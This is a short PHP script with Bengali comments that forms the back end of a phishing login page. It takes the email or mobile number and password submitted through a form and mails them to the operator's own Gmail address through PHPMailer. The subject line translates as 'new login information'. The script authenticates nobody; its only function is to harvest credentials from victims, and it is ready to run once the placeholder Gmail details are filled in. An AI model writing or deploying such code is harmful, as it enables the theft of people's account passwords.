<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'yourgmail@gmail.com'; // আপনার Gmail
        $mail->Password = 'your_app_password';   // Gmail App Password
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('yourgmail@gmail.com', 'Login Info');
        $mail->addAddress('yourgmail@gmail.com'); // নিজেরই Gmail এ পাঠানো

        $mail->Subject = 'নতুন লগইন তথ্য';
        $mail->Body = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";

        $mail->send();
        echo "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
    } catch (Exception $e) {
        echo "❌ ইমেইল পাঠাতে ব্যর্থ হয়েছে। Error: {$mail->ErrorInfo}";
    }
}
?>
